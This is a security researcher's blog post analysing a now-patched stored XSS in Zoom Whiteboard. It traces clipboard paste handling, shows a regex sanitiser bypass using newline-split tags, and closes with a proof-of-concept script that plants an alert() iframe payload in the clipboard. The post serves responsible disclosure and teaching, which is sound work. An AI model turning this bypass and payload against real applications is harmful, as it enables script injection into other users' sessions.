---
source: spaceraccoon
source_url: https://spaceraccoon.dev/analyzing-clipboardevent-listeners-stored-xss/
title: "I Hope This Sticks: Analyzing ClipboardEvent Listeners for Stored XSS | Spaceraccoon's Blog"
published: 2022-12-17T15:29:00+00:00
description: "When is copy-paste payloads not self-XSS? When it’s stored XSS. Recently, I reviewed a Zoom’s code to uncover an interesting attack vector."
---

[Get my new book with No Starch Press "From Day Zero to Zero Day: A Hands-On Guide to Vulnerability Research" here! 🚀](https://nostarch.com/zero-day)

# I Hope This Sticks: Analyzing ClipboardEvent Listeners for Stored XSS

Dec 17, 2022
·

1700 words

·

8 minute read


When is copy-paste payloads not self-XSS? When it’s stored XSS. Recently, I reviewed Zoom’s code to uncover an interesting attack vector. Along the way, I dived into the [ClipboardEvent](https://developer.mozilla.org/en-US/docs/Web/API/ClipboardEvent) and [DataTransfer](https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer) web APIs and learned a lot about dynamic drag-and-drop internals.

# The Serialised Sink [🔗](https://spaceraccoon.dev/analyzing-clipboardevent-listeners-stored-xss/\#the-serialised-sink)

Zoom includes a [Zoom Whiteboard](https://explore.zoom.us/en/products/online-whiteboard/) feature that allows users to collaborate on a shared canvas with sticky notes, diagrams, rich text, and all the typical real-time document collaboration features we’ve come to expect.

![Zoom Whiteboard](https://spaceraccoon.dev/images/25/zoom_whiteboard.png)

Interestingly, this featured works on both the web and native clients using JavaScript and an embedded browser. Thanks to this cross-platform support, I could easily retrieve the client-side code for this feature. Furthermore, the application included the source map of the webpacked code, allowing me to easily unpack it into the original directory structure using tools like my own [Webpack Exploder](https://spaceraccoon.github.io/webpack-exploder/).

After quickly skimming the code and running a couple default scans with CodeQL, I noticed that the following function appeared to be extracting user data from the clipboard using the `DataTransfer.getData()` function:

```typescript
  private prepareData(t: DataTransfer | null): ReadData | undefined {
    if (!t) return;
    return {
      html: t.getData(MIME_TYPE.TEXT_HTML),
      text: t.getData(MIME_TYPE.TEXT_PLAIN),
      files: Array.from(t.files || []),
    };
  }
```

Tracing further back to the code that called `prepareData`, I confirmed that this indeed originated from a paste event listener:

```typescript
document.addEventListener("paste", this.pasteListener);
...
private pasteListener = (evt: ClipboardEvent) => {
    this.pasteWrapper(this.prepareData(evt.clipboardData));
  };
```

Reading the MDN docs (I REALLY recommend this), I learned that the paste event includes a `clipboardData` property that is an instance of a `DataTransfer` object. In turn, `DataTransfer` objects include a [`getData(format)`](https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer/getData) function. The [documentation](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API/Recommended_drag_types) further elaborates that the `format` argument can be several types depending on the pasted data, from `text/plain` (for typical plaintext) to `text/uri-list` (for URLs or files via the `data:` URI) as well as proprietary types like `application/x-moz-file`. The specification is fascinating and definitely worth researching further for browser-specific bugs. Here, the `text/html` type specified **serialised** (this will be important later) HTML data.

One interesting detail is that the clipboard can contain different sets of data types:

```typescript
const dt = event.dataTransfer;
dt.setData("text/html", "Hello there, <strong>stranger</strong>");
dt.setData("text/plain", "Hello there, stranger");
```

In any case, most applications use the `text/html` type for copying and pasting rich data like slides, diagrams, and so on. After extracting this rich data from the clipboard, the application then added it to the page via `page.paste()`.

```typescript
  private pasteWrapper = async (t?: ReadData) => {
    ...
    await this.read();
    ...
    await page.paste(position);
  };
```

Before getting too excited about the `paste`, I needed to understand how the `read` function parsed the clipboard data into HTML nodes that were actually added to the page.

```typescript
private async read() {
    let items: ClipboardItems = [];
    try {
      items = await navigator.clipboard.read();
    } catch (err) {
      SYSTEM_LOGGER.warn(err);
      return;
    }
    const target = items.pop();
    if (!target) return;
    const type = target.types[target.types.length - 1];
    if (!type) return;
    const b = await target.getType(type);
    ...
    if (type === MIME_TYPE.TEXT_PLAIN) {
      const t = await b.text();
      t && data.push(this.createTextBox(t));
    } else if (IMAGE_REGEXP.test(type)) {
      const ext = getBlobTypeExt(b);
      if (!ext) return;
      const f = new File([b], `image.${ext}`, { type });
      if (!this.uploadPermission(f)) return;
      const img = await this.createImage(f);
      img && data.push(img);
    } else if (type === MIME_TYPE.TEXT_HTML) {
      const zdcData = await getZDCCopyObjects(b);
      if (zdcData) {
        data.push(...zdcData.objs);
        zdcData.meta && this.updateMeta(zdcData.meta);
      } else {
        const t = getStringFromHtmlString(await b.text());
        t && data.push(this.createTextBox(t));
      }
    ...
}
```

Here, the code read an array of `ClipboardItem` objects from the clipboard, then read the first `ClipboardItem` in the array and parsed it depending on its type. Each of these returned a `ZDCCopyObject` instance which turned out to be a custom [Protocol Buffer](https://github.com/protocolbuffers/protobuf) type. This type represented an item in the Whiteboard, such as a text box, sticky note, doagram, or image. For example, for images:

```typescript
  private async createImage(file: File) {
    ...
    return {
      pageID: parseInt(page.id),
      id,
      wireType: WBObjType.WB_OBJ_TYPE_IMAGE,
      transform: [scale, 0, 0, scale, left, top],
      fileID,
      size: originSize,
      originalID: id,
    } as ZDCCopyObject;
  }
```

I recognised these serialised protocol buffers in the WebSocket messages sent from the clients to the server, meaning that the clients sent the pasted data as-is to the server. While the image and plaintext types did not seem particularly interesting after inspecting the code, the HTML type drew my attention because it parsed the data in a complicated way:

```typescript
export async function getZDCCopyObjects(b: Blob) {
  if (b.type !== MIME_TYPE.TEXT_HTML) return;
  const t = await b.text();

  return getZDCCopyObjectsFromHtmlString(t);
}

export const ExtractCopy = /^<--\(zdc-data\)(.*)\(\/zdc-data\)-->$/;

export const CopyMeta = {
  tag: "span",
  meta: "data-meta",
};

export function getZDCCopyObjectsFromHtmlString(s: string) {
  try {
    const d = new DOMParser().parseFromString(s, MIME_TYPE.TEXT_HTML);
    const el = d.querySelector(`${CopyMeta.tag}[${CopyMeta.meta}]`);
    if (!el) return;
    const bta = el.getAttribute(CopyMeta.meta);
    if (!bta) return;
    const match = bta.match(ExtractCopy);
    if (!match || !match[1]) return;
    const { objs, meta } = JSON.parse(
      decodeURIComponent(window.atob(match[1]))
    ) as {
      objs: ZDCCopyObject[];
      meta?: ClipTargetMeta;
    };
    return Array.isArray(objs) ? { objs, meta } : undefined;
  } catch (err) {
    SYSTEM_LOGGER.warn(err);
  }
}
```

In short, the data is “deserialised” from the clipboard data via the following steps:

1. Parse the clipboard data as HTML.
2. Extract the value of the `data-meta` attribute in the first `span` element in the HTML.
3. Confirm the value matches the regex `/^<--\(zdc-data\)(.*)\(\/zdc-data\)-->$/` and extract the inner match.
4. Base64-decode the inner match.
5. URI-decode the base64-decoded data.
6. Parse the result as `{ objs: ZDCCopyObject[]; meta?: ClipTargetMeta; }`, where `ZDCCopyObject` is the representation of a Whiteboard item and `ClipTargetMeta` is the item’s metadata like xy-position in the whiteboard.
7. Return the deserialised result.

It seemed like I was getting close to an XSS - remember that these Whiteboard items are transmitted via Websocket as a serialized Protocol Buffer to the server, then sent to all other viewers of the Whiteboard to update their real-time view. Now I needed to review the **sinks** of this input.

# The Not-So-Sanitised Source [🔗](https://spaceraccoon.dev/analyzing-clipboardevent-listeners-stored-xss/\#the-not-so-sanitised-source)

By inspecting the custom Protocol Buffer definitions, I discovered that Whiteboard supported the following item types:

```typescript
export enum WBObjType {
  WB_OBJ_TYPE_UNKNOWN,
  WB_OBJ_TYPE_SHAPE,
  WB_OBJ_TYPE_LINE,
  WB_OBJ_TYPE_TEXT,
  WB_OBJ_TYPE_RICHTEXT,
  WB_OBJ_TYPE_GROUP,
  WB_OBJ_TYPE_SCRIBBLE,
  WB_OBJ_TYPE_STICKYNOTE,
  WB_OBJ_TYPE_IMAGE,
  WB_OBJ_TYPE_COMMENT,
}
```

Whenever a new item was broadcasted to Whiteboard viewers by Websocket, the `createFabricObject` function on the client side would insert the matching React component into the page. Here, I hit a snag - since React sanitises all attributes by default, the only way any user-controlled input could cause an XSS was if it was inserted with the [`dangerouslySetInnerHTML`](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml) attribute. However, none of the components in the client-side code used `dangerouslySetInnerHTML`… or so I thought. While playing with different payloads on the Whiteboard items, I noticed that certain HTML tags like `<b>` worked when I entered them directly in sticky notes, while others were sanitised. How was this happening without `dangerouslySetInnerHTML`?

As it turned out, several components, like sticky notes, were using the [`react-contenteditable`](https://www.npmjs.com/package/react-contenteditable) dependency as a child component. By design, `react-contenteditable` [passes the `html` attribute to `dangerouslySetInnerHTML`](https://github.com/lovasoa/react-contenteditable/blob/master/src/react-contenteditable.tsx#L53)!

The developers seemed aware of this as they used a strict DOMPurify configuration to sanitise the `html` attribute:

```typescript
export const sanitizeHTML = (content: string) => {
  return DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ["b", "i", "div", "br"],
    ALLOWED_ATTR: [],
  });
};
...
<ContentEditable
  className="content-editable-list"
  disabled
  html={sanitizeHTML(c.content)}
  onChange={() => {}}
/>
```

Unfortunately, after checking all instances of `ContentEditable` in the code, I discovered that they forgot to use `sanitizeHTML` on the `ContentEditable` child of the `StickyNote` component! However, after excitedly trying a few more payloads, I realised that the developers allowed this because they ran another sanitisation function `convertToText` on the input before passing it back to the `ContentEditable``html` attribute:

```typescript
export const convertToText = (str = "") => {
  // Ensure string.
  let value = String(str);

  // Convert encoding.
  value = value.replace(/&nbsp;/gi, " ");
  value = value.replace(/&amp;/gi, "&");

  // Replace `<br>`.
  value = value.replace(/<br>/gi, "\n");

  // Replace `<div>` (from Chrome).
  value = value.replace(/<div>/gi, "\n");

  // Replace `<p>` (from IE).
  value = value.replace(/<p>/gi, "\n");

  // Remove extra tags.
  value = value.replace(/<(.*?)>/g, "");

  return value;
};
```

This function used regexes to replace a few HTML tags with their visual equivalents, such as newlines for `div`, and removed any other tags. It also converted a few HTML encodings to prevent bypasses.

How could I beat a regex like `/<(.*?)>/g`? The first clue was that `><` still passed the sanitisation without any changes. Furthermore, while the regex used the `/g` global flag to replace all matches, it failed to include the `/m` multiline flag. As such, `<script \n>alert()</script \n/>` emerged unscathed!

Now, all I needed to do was to generate the serialised Protocol Buffer and send it by Websocket. However, why not write a script to add it to my clipboard and paste it to trigger the XSS? Way more fun and easier to reproduce by the triagers :)

```typescript
// changed some values
var objs = [{\
	id: 123,\
	pageID: 123,\
	size: [1000, 1000],\
	transform: [1, 0, 0, 1, 1010, 76],\
	stickyWriterName: "Test",\
	fill: 4293630463,\
	stroke: 4294967295,\
	strokeWidth: 1,\
	fontSize: 32,\
	fontWeight: "normal",\
	textAlign: 1,\
	text: "<iframe srcdoc='&#x3c;script&#x3e;alert()&#x3c;/script&#x3e;' \n></iframe\n>",\
	textFill: 572666111,\
	createTime: 1659021155815,\
	modifiedTime: 1659021155815,\
	wireType: 7,\
	parentID: 171946614915072,\
	originalID: 79322586389\
}]
var meta = {
	docID: "abc123",
	originalCopyCenterPos: {
		x: 1010,
		y: 76
	}
}

function getHtmlString(objs, meta) {
	const str = JSON.stringify({
		objs,
		meta
	});
	const b = window.btoa(encodeURIComponent(str));
	return `<meta charset="utf-8"><span data-meta="<--(zdc-data)${b}(/zdc-data)-->"></span>`;
}

function getHtmlBlob(objs, meta) {
	return new Blob([getHtmlString(objs, meta)], {
		type: "text/html",
	});
}

var i = {}
i["text/html"] = getHtmlBlob(objs, meta)
setTimeout(function() {
	navigator.clipboard.write([new ClipboardItem(i)]);
	console.log("Payload added to clipboard")
}, 1500)
```

# Disclosure Timeline [🔗](https://spaceraccoon.dev/analyzing-clipboardevent-listeners-stored-xss/\#disclosure-timeline)

The Zoom team quickly resolved the vulnerability, a mark of a good security program.

- 29 July: Initial Disclosure
- 2 August: Triaged
- 21 August: Patched

# Final Thoughts [🔗](https://spaceraccoon.dev/analyzing-clipboardevent-listeners-stored-xss/\#final-thoughts)

I really enjoyed going down this rabbit hole that snatched a bug out of multiple sanitisation and validation steps. The clipboard attack vector presents interesting scenarios because it is controllable via JavaScript APIs. It’s important to note that the payload was transmitted to other users via Websocket and also rendered unsanitised, so it’s not the same as copy-pasting JS in the console. It’s definitely worth digging deeper into the MDN documentation here to figure out more interesting attack vectors.

Since the vulnerable sink existed in a dependency, my CodeQL scan missed it. This bug would’ve also been missed by default DevSecOps pipelines since code scans usually occur in the `test` stage prior to any sort of dynamic testing where dependencies are installed.

Also: regexes are usually tricky for sanitisation.

[web](https://spaceraccoon.dev/tags/web) [code review](https://spaceraccoon.dev/tags/code-review)